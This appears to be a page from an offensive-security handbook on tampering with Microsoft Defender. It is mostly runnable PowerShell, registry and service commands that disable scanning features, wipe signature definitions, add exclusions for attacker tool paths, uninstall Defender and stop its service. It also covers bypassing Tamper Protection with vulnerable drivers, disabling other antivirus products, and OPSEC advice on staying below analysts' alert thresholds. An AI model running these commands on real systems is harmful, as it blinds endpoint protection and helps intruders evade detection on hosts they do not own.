---
title: "Defender Tamper"
---

# 🧯 Defender Tamper

> _Direct attack on Microsoft Defender: disable features, add exclusions, remove
> definitions, uninstall. The loudest option in this chapter - every one of
> these generates an event, often streamed to Defender for Endpoint cloud in
> near real-time. Prefer [signatures](./signatures.md) and
> [amsi](./amsi.md) when noise matters more than speed._

## 📚 Resources

- [Microsoft - Set-MpPreference](https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference)
- [Microsoft - Tamper Protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection)
- [SpecterOps - Tamper Protection internals](https://posts.specterops.io/)
- [ATT&CK T1562.001 - Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)

## 🛠️ Tools

- `Set-MpPreference` / `Add-MpPreference` - the builtin `Defender` PowerShell module
- `MpCmdRun.exe` - Defender CLI, in `C:\ProgramData\Microsoft\Windows Defender\Platform\<ver>\`
- `sc.exe` / `Stop-Service` - service control (blocked by Tamper Protection)
- `dism.exe` / `Uninstall-WindowsFeature` - remove the feature entirely (Server only)
- [Seatbelt](https://github.com/GhostPack/Seatbelt) - `AntiVirus`, `WindowsDefender` commands for recon
- [Invoke-Phantom](https://github.com/n4rr34n6/Invoke-Phantom) - kill AV worker threads from userland

## 🔍 Preflight

Know what you're fighting before you touch anything.

```powershell
# Defender status + which features are already off
Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled, `
  RealTimeProtectionEnabled, IsTamperProtected, AntivirusSignatureAge

# Current preferences (exclusions, cloud settings, ...)
Get-MpPreference

# Registered AV products (3rd-party AV may already have disabled Defender)
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct

# Can we actually tamper? (need High integrity / SYSTEM)
whoami /groups | findstr /i "High\|System"
```

Tamper Protection decision table:

| State                       | What works                          | What's blocked                                           |
| --------------------------- | ----------------------------------- | -------------------------------------------------------- |
| `IsTamperProtected = False` | Everything below                    | -                                                        |
| `IsTamperProtected = True`  | Possibly GPO / registry policy keys | `Set-MpPreference`, `sc stop WinDefend`, service removal |

If TP is on and you're not kernel-level, go indirect (exclusions via GPO, or dodge entirely via [signatures](./signatures.md) / [amsi](./amsi.md)).

## 🚫 Disable scanning features

::: code-group

```powershell [Core switches]
# Needs Admin + Tamper Protection off
Set-MpPreference -DisableRealtimeMonitoring        $true
Set-MpPreference -DisableBehaviorMonitoring        $true
Set-MpPreference -DisableScriptScanning            $true
Set-MpPreference -DisableArchiveScanning           $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableIOAVProtection            $true   # blocks download scan
Set-MpPreference -DisableBlockAtFirstSeen          $true   # kills cloud lookup gate
```

```powershell [Cloud / MAPS]
# Cloud-delivered protection
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend
Set-MpPreference -CloudBlockLevel Disabled
Set-MpPreference -CloudExtendedTimeout 0

# ASR / Controlled Folder Access
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -AttackSurfaceReductionRules_Actions Disabled
```

```powershell [Definitions]
# Wipe signatures outright - forces Defender into a known-blind state
$mp = Resolve-Path "$env:ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe" | Select -Last 1
& $mp -RemoveDefinitions -All
& $mp -RemoveDefinitions -DynamicSignatures
```

:::

> [!warning]
> `-DisableRealtimeMonitoring` alone fires Event ID **5001** immediately on the
> `Microsoft-Windows-Windows Defender/Operational` channel. On MDE-onboarded
> hosts, the cloud sees it in under a minute. Prefer exclusions when possible.

## 🧷 Exclusions (the quiet option)

Exclusions are logged (Event ID 5007) but far less noisy than disabling RT protection - Defender keeps running, which looks "normal" to analysts.

```powershell
# Path - target a specific folder your tools run from
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Process (by image name)
Add-MpPreference -ExclusionProcess "svchost.exe"

# Extension
Add-MpPreference -ExclusionExtension ".tmp"

# IP (for network IOA rules)
Add-MpPreference -ExclusionIpAddress "10.0.0.5"
```

```powershell
# Clean up on the way out
Remove-MpPreference -ExclusionPath    "C:\Windows\Temp"
Remove-MpPreference -ExclusionProcess "powershell.exe"
```

## 📜 Via GPO / registry policy

If PowerShell cmdlets are blocked by Tamper Protection but reg write is open, the policy keys sometimes stick on unmanaged hosts.

```powershell
$k = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
New-Item -Path $k -Force | Out-Null
Set-ItemProperty -Path $k -Name "DisableAntiSpyware" -Value 1 -Type DWord

$rt = "$k\Real-Time Protection"
New-Item -Path $rt -Force | Out-Null
Set-ItemProperty -Path $rt -Name "DisableRealtimeMonitoring"  -Value 1 -Type DWord
Set-ItemProperty -Path $rt -Name "DisableBehaviorMonitoring"  -Value 1 -Type DWord
Set-ItemProperty -Path $rt -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord

# Force a GPO refresh
gpupdate /force
```

On a domain-joined / Intune-managed host, these keys get overwritten at the next policy pull. Combine with a GPO-strip or MDM disconnect - out of scope here.

## 🗑️ Uninstall

Server and client behave differently - Windows 10/11 has no clean uninstaller.

```powershell
# Windows Server - clean removal
Uninstall-WindowsFeature -Name Windows-Defender -IncludeManagementTools -Restart

# Windows 10/11 - disable via feature set (no removal)
Dism /online /Disable-Feature /FeatureName:Windows-Defender /NoRestart

# Attempt to disable the service (blocked when TP is on, even as SYSTEM)
sc.exe config WinDefend start= disabled
sc.exe stop   WinDefend
```

## 🪤 Tamper Protection

TP is enforced in kernel by `WdFilter.sys`. From user-mode (even as SYSTEM) you cannot flip the `TamperProtection` registry value directly. Options:

- **BYOVD** - load a vulnerable signed driver (`RTCore64.sys`, `gdrv.sys`, ...) and call its arbitrary kernel-write primitive to flip the kernel flag. Properly red-teamish, covered in future `evasion/`.
- **Safe Mode boot** - reboot into Safe Mode, `WdFilter.sys` doesn't load. Needs a reboot (loud, requires physical/admin).
- **MDE portal** - if the target tenant is onboarded to Defender for Endpoint, TP can be toggled from the portal. Only works if you control the tenant.

If you see `IsTamperProtected = True` and don't have BYOVD, work around via [signatures](./signatures.md) + [amsi](./amsi.md) instead of fighting it.

## 🎭 Other AV (tamper notes)

| AV                     | Process(es)                                      | Disable notes                                                                            |
| ---------------------- | ------------------------------------------------ | ---------------------------------------------------------------------------------------- |
| **Kaspersky**          | `avp.exe`, `avpui.exe`, `klnagent.exe`           | PPL self-defense + GUI password; needs admin password or offline reg patch               |
| **ESET**               | `egui.exe`, `ekrn.exe`                           | Password-protected config; offline XML edit works ; HIPS blocks runtime stop             |
| **Sophos**             | `SophosFS.exe`, `SophosMCSAgent.exe`             | Tamper-protected via central policy; local uninstall needs one-time token                |
| **CrowdStrike Falcon** | `CSFalconService.exe`, `CSAgent.sys`             | Uninstall requires maintenance token from console; PPL. Treat as EDR -> future `evasion/` |
| **SentinelOne**        | `SentinelAgent.exe`, `SentinelHelperService.exe` | Site token required for uninstall / API-key disable from mgmt console                    |

Non-Defender AV products usually run as PPL (Protected Process Light): `taskkill` / `sc stop` returns Access Denied even as SYSTEM. Go kernel (driver-level) or go indirect.

## 🛡️ OPSEC

Key event IDs on `Microsoft-Windows-Windows Defender/Operational`:

| Event ID | Meaning                                          | Analyst severity                   |
| -------- | ------------------------------------------------ | ---------------------------------- |
| 1121     | ASR rule triggered                               | High                               |
| 5001     | Real-time protection disabled                    | **Very high** - critical MDE alert |
| 5004     | Real-time protection configuration changed       | High                               |
| 5007     | Defender configuration changed (exclusions, ...) | Medium                             |
| 5010     | Scanning for malware disabled                    | **Very high**                      |
| 5012     | Scanning for viruses disabled                    | **Very high**                      |

Minimum-noise order of preference:

1. **Exclusions** (5007 only) - targeted, surgical.
2. **Signature-level bypass** - no Defender event at all (-> [signatures](./signatures.md), [amsi](./amsi.md)).
3. **Specific feature disable** - `DisableBehaviorMonitoring` is quieter than `DisableRealtimeMonitoring`.
4. **Full disable / uninstall** - only on hosts going offline the same day.

If the host is MDE-onboarded (check `Get-Service -Name Sense`), **assume the cloud sees everything within minutes**. Scope your work accordingly.
